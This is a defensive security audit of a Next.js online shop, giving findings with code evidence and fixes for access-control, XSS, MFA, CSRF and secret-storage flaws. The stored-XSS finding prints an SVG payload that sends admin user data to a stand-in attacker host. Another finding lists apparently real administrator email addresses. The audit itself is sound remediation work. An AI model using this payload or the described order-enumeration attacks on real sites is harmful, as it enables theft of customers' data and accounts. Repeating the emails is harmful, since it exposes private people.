# 03 — DEEP DEFENSIVE SECURITY AUDIT

This audit reviews trust boundaries, identity verification, authorization logic, input validation, cryptographic practices, and infrastructure exposure in accordance with the OWASP Top 10 (2021) and ASVS 4.0 guidelines.

---

## 1. Security Vulnerability Summary Table

| Finding ID | Title | OWASP Category | Severity | Confidence | Verification Status |
| :--- | :--- | :--- | :---: | :---: | :---: |
| **AUDIT-001** | BOLA / IDOR Guest Invoice PDF Download | A01:2021-Broken Access Control | **Critical** | High | Confirmed Static Analysis |
| **AUDIT-002** | Digital Gift Token Leakage in Public Order Tracking | A01:2021-Broken Access Control | **Critical** | High | Confirmed Static Analysis |
| **AUDIT-003** | Stored Cross-Site Scripting via Unsanitized SVG Uploads | A03:2021-Injection | **High** | High | Confirmed Static Analysis |
| **AUDIT-004** | Global Client IP Collapse & Denial of Service | A04:2021-Insecure Design | **High** | High | Confirmed Static Analysis |
| **AUDIT-005** | Admin MFA Bypass for Un-enrolled Administrators | A07:2021-Identification & Auth Failures | **High** | High | Confirmed Static Analysis |
| **AUDIT-006** | Plaintext Storage of Sensitive Mailer Credentials | A02:2021-Cryptographic Failures | **Medium** | High | Confirmed Static Analysis |
| **AUDIT-007** | Hardcoded Super-Admin Email Addresses in Source Code | A07:2021-Identification & Auth Failures | **Medium** | High | Confirmed Static Analysis |
| **AUDIT-008** | Inconsistent CSRF Defense across Administrative Routes | A01:2021-Broken Access Control | **Medium** | High | Confirmed Static Analysis |
| **AUDIT-013** | Unbounded Unauthenticated Click Inflation | A04:2021-Insecure Design | **Low** | High | Confirmed Static Analysis |

---

## 2. Detailed Vulnerability Analyses

### AUDIT-001: Broken Object-Level Authorization (BOLA/IDOR) in Guest Invoice PDF Download
- **Severity:** Critical (CVSS 8.6)
- **Category:** A01:2021-Broken Access Control
- **Affected File:** `src/app/api/orders/[id]/invoice/route.ts#L41-L47`
- **Description:**
  When downloading an order invoice, if the order was placed as a guest (`order.userId === null`), the endpoint attempts to check the `email` query parameter. However, the condition checks `if (emailParam && emailParam.toLowerCase() !== order.customerEmail.toLowerCase())`. If the caller omits `?email=`, `emailParam` is null, the check is skipped completely, and the server generates and delivers the full PDF invoice without requiring any authentication.
- **Evidence:**
  ```typescript
  // src/app/api/orders/[id]/invoice/route.ts:41-47
  if (order.userId) {
    const auth = await requireAuth();
    if (auth instanceof NextResponse) return auth;
    if (auth.user.id !== order.userId && auth.user.role !== "ADMIN") {
      return NextResponse.json({ error: "Unauthorized access to invoice" }, { status: 403 });
    }
  } else {
    // Guest order verification: verify caller email matches if provided
    const emailParam = req.nextUrl.searchParams.get("email");
    if (emailParam && emailParam.toLowerCase().trim() !== order.customerEmail.toLowerCase().trim()) {
      return NextResponse.json({ error: "Unauthorized access to invoice" }, { status: 403 });
    }
  }
  ```
- **Impact:** Any anonymous user can download customer invoices by cycling order numbers (e.g., `AH-0001` to `AH-9999` or alphanumeric hashes). Invoices contain customer full name, personal email, phone number, payment method, gateway transaction ID, and purchased software items.
- **Remediation:** Require guest verification by enforcing that `emailParam` MUST be present, or generate a cryptographically signed HMAC token for invoice download links sent to the customer's email.
  ```typescript
  } else {
    const emailParam = req.nextUrl.searchParams.get("email");
    if (!emailParam || emailParam.toLowerCase().trim() !== order.customerEmail.toLowerCase().trim()) {
      return NextResponse.json({ error: "Unauthorized access to invoice" }, { status: 403 });
    }
  }
  ```

---

### AUDIT-002: Digital Gift Claim Token Leakage in Public Order Tracking
- **Severity:** Critical (CVSS 9.1)
- **Category:** A01:2021-Broken Access Control
- **Affected File:** `src/app/api/orders/route.ts#L137`
- **Description:**
  The public order tracking endpoint (`GET /api/orders?tracking=true&query=...`) masks customer names, phone numbers, and emails to preserve privacy. However, line 137 explicitly includes `giftClaimToken: tracked.giftClaimToken || null` in the public JSON response. Any visitor searching by order number or customer phone number receives the raw `giftClaimToken`.
- **Evidence:**
  ```typescript
  // src/app/api/orders/route.ts:137
  return {
    id: tracked.orderNumber || tracked.id,
    orderNumber: tracked.orderNumber || tracked.id,
    customerName: maskName(tracked.customerName),
    // ...
    isGift: tracked.isGift || false,
    recipientName: tracked.recipientName || null,
    giftClaimToken: tracked.giftClaimToken || null, // <-- CRITICAL LEAK
  };
  ```
  And in `src/lib/gifting/product-gifting.ts#L102-L120`:
  ```typescript
  deliveredCredentials: order.deliveryStatus === "DELIVERED"
    ? order.deliveredKeys.map((k) => ({
        licenseKey: parsed.licenseKey || null,
        accountEmail: parsed.accountEmail || null,
        accountPassword: parsed.accountPassword || null,
        accessUrl: parsed.accessUrl || null,
        credentialsText: k.credentials,
        instructions: k.instructions || null,
      }))
    : []
  ```
- **Impact:** An attacker who knows or queries a customer's phone number or order number can steal delivered digital accounts, software keys, and passwords for any gift order without logging in.
- **Remediation:** Remove `giftClaimToken` from public order tracking responses. Claim tokens must only be transmitted to the buyer upon checkout completion and to the recipient via direct delivery channels (email/SMS/WhatsApp).

---

### AUDIT-003: Stored Cross-Site Scripting via Unsanitized SVG Uploads
- **Severity:** High (CVSS 8.2)
- **Category:** A03:2021-Injection
- **Affected Files:**
  - `src/lib/security/upload-validator.ts#L52-L56`
  - `src/app/api/upload/route.ts#L46-L64`
  - `next.config.mjs#L3`
- **Description:**
  The upload validator inspects magic bytes for image formats. For SVG, it checks whether the buffer starts with `<svg` or `<?xml` and returns `valid: true, detectedFormat: "svg"`. The file is saved directly to `public/uploads/` with a `.svg` extension. No XML sanitization (e.g. `isomorphic-dompurify`) or script stripping is performed. Furthermore, `next.config.mjs` sets Content Security Policy with `script-src 'self' 'unsafe-eval' 'unsafe-inline'`.
- **Evidence:**
  ```typescript
  // src/lib/security/upload-validator.ts:52-56
  const headText = buffer.slice(0, 200).toString("utf-8").toLowerCase();
  if (headText.includes("<svg") || headText.includes("<?xml") && headText.includes("svg")) {
    return { valid: true, detectedFormat: "svg" };
  }
  ```
  An uploaded SVG payload such as:
  ```xml
  <svg xmlns="http://www.w3.org/2000/svg" onload="fetch('/api/admin/users').then(r=>r.json()).then(d=>fetch('https://attacker.com/exfil?d='+btoa(JSON.stringify(d))))"></svg>
  ```
  will execute Javascript in the browser of any user or administrator viewing the file directly at `https://aihaat.shop/uploads/img_....svg`.
- **Impact:** Full session hijack of administrators and users, exfiltration of NextAuth session tokens, or unauthorized state changes.
- **Remediation:**
  1. Disallow SVG uploads entirely, or strip all `<script>`, `<foreignObject>`, inline event handlers (`onload`, `onclick`), and `javascript:` URIs using a strict XML sanitizer before writing to disk.
  2. Serve uploaded user content from an isolated subdomain (e.g. `uploads.aihaat.shop` or Cloudflare R2 bucket) with `Content-Disposition: attachment` or `Content-Security-Policy: default-src 'none'`.

---

### AUDIT-004: Global Client IP Collapse & Application-Wide Denial of Service
- **Severity:** High (CVSS 7.5)
- **Category:** A04:2021-Insecure Design
- **Affected File:** `src/lib/rate-limit.ts#L70-L73`
- **Description:**
  `getClientIp(req)` inspects `cf-connecting-ip` and `x-forwarded-for` only if `process.env.TRUST_PROXY === "true"`. In `.env`, `TRUST_PROXY` is undefined. The function falls through to:
  ```typescript
  return "unknown:direct";
  ```
  Consequently, **every incoming request from every user in the world resolves to the identical IP string `"unknown:direct"`**.
- **Evidence:**
  In `src/app/api/payment/create/route.ts#L8-L12`:
  ```typescript
  const ip = getClientIp(req); // Always "unknown:direct"
  const rateLimit = checkRateLimit(`payment-create:${ip}`, 6, 60 * 1000);
  if (!rateLimit.allowed) {
    return rateLimitResponse(rateLimit.retryAfterMs, "পেমেন্ট রিকোয়েস্ট সীমা অতিক্রম করেছে...");
  }
  ```
- **Impact:** If 6 users globally initiate checkout within 60 seconds, all subsequent legitimate buyers on the site receive HTTP 429 and are blocked from checking out. The same collapse occurs on `/api/orders` (15 orders/10 minutes globally) and `/api/wallet/recharge` (5 topups/10 minutes globally).
- **Remediation:**
  1. Configure `TRUST_PROXY=true` and `TRUST_CF_CONNECTING_IP=true` in `.env.production` when deployed behind Cloudflare or NGINX.
  2. In `getClientIp()`, if not running behind a proxy, extract client IP from the socket connection (`req.ip` in Node or standard socket remoteAddress) rather than returning a static global string.

---

### AUDIT-005: Admin MFA Bypass for Un-enrolled Administrators
- **Severity:** High (CVSS 7.4)
- **Category:** A07:2021-Identification & Authentication Failures
- **Affected Files:** `src/lib/auth-guard.ts#L80-L120`, `src/components/admin/AdminLayoutClient.tsx#L177-L212`
- **Description:**
  `requireAdminMfa()` calls `requireMfaVerified()`. In `requireMfaVerified()`:
  ```typescript
  let isMfaEnabled = false;
  try {
    const userSecurity = await prisma.userSecurity.findUnique({
      where: { userId: auth.user.id }
    });
    isMfaEnabled = userSecurity?.totpEnabled ?? false;
  } catch (err) {}
  
  if (isMfaEnabled) {
    // Verifies TOTP cookie session...
  }
  
  // FALLBACK IF NOT ENABLED:
  return {
    user: auth.user,
    mfaSession: { id: 'no-mfa-required', mfaLevel: 'NONE', ... }
  };
  ```
  If an administrator account has not set up TOTP, `isMfaEnabled` is false. The guard returns success with `mfaLevel: 'NONE'`. The admin layout and backend endpoints treat the administrator as fully authorized, bypassing MFA requirements completely.
- **Impact:** Admin accounts compromised via Google OAuth or session hijacking require zero two-factor authentication to access the admin portal, manage orders, and modify customer data.
- **Remediation:** Enforce mandatory MFA enrollment for all accounts with `role === "ADMIN"`. If `totpEnabled === false`, return HTTP 403 with `code: 'MFA_ENROLLMENT_REQUIRED'` and redirect the user immediately to `/admin/mfa-setup`.

---

### AUDIT-006: Plaintext Storage of Sensitive Mailer Credentials in Database
- **Severity:** Medium (CVSS 6.2)
- **Category:** A02:2021-Cryptographic Failures
- **Affected File:** `src/app/api/admin/email-marketing/settings/route.ts#L61-L79`
- **Description:**
  When configuring email marketing settings, `smtpPass` (Hostinger email password) and `apiKey` are written directly to the `site_settings` table in MySQL as clear plaintext strings:
  ```typescript
  if (smtpPass && smtpPass.trim()) updates.push({ key: "email_marketing_smtp_pass", value: String(smtpPass).trim() });
  if (apiKey && apiKey.trim()) updates.push({ key: "email_marketing_api_key", value: String(apiKey).trim() });
  ```
- **Impact:** Read access to the database or SQL backups exposes third-party SMTP passwords and API tokens.
- **Remediation:** Encrypt all secrets before saving to `site_settings` using `encryptCredential()` from `src/lib/mfa/crypto.ts`, decrypting them only when instantiating the Nodemailer transporter.

---

### AUDIT-007: Hardcoded Super-Admin Email Addresses
- **Severity:** Medium (CVSS 5.3)
- **Category:** A07:2021-Identification & Authentication Failures
- **Affected File:** `src/lib/auth.ts#L6-L11`
- **Description:**
  Super-admin email addresses are hardcoded directly in application source code:
  ```typescript
  export const DEFAULT_ADMIN_EMAILS = [
    "mdamanullahsheikhapon@gmail.com",
    "seratul.alim@gmail.com",
    "seratulalimkhanrhythm@gmail.com",
    "admin@aihaat.com",
  ];
  ```
- **Impact:** Hardcoded credentials cannot be revoked or rotated without modifying code, rebuilding, and redeploying the application. Anyone obtaining access to any of these four Google accounts automatically gains super-admin privileges across all deployments.
- **Remediation:** Remove hardcoded email lists from source code. Read admin emails strictly from the `ADMIN_EMAILS` environment variable or manage roles dynamically via database records.

---

### AUDIT-008: Inconsistent CSRF Enforcement Across Administrative Routes
- **Severity:** Medium (CVSS 5.8)
- **Category:** A01:2021-Broken Access Control
- **Affected Files:** All admin mutation routes under `src/app/api/admin/**`
- **Description:**
  `isSameOriginMutation()` defends cookie-authenticated mutations against CSRF. However, it is only called in 7 customer endpoints (`orders`, `product-request`, `refunds`, `replacements`, `wallet/purchase`, `wallet/recharge`, `affiliate/payout`). **Zero administrative endpoints call `isSameOriginMutation()`**.
- **Impact:** If an administrator visits a malicious website while logged into AI Haat, a crafted cross-site request could trigger bulk user role updates, coupon creations, or setting alterations if browser SameSite policies are relaxed.
- **Remediation:** Implement global CSRF enforcement in a Next.js `middleware.ts` for all `POST`, `PATCH`, `PUT`, and `DELETE` requests carrying authentication cookies.
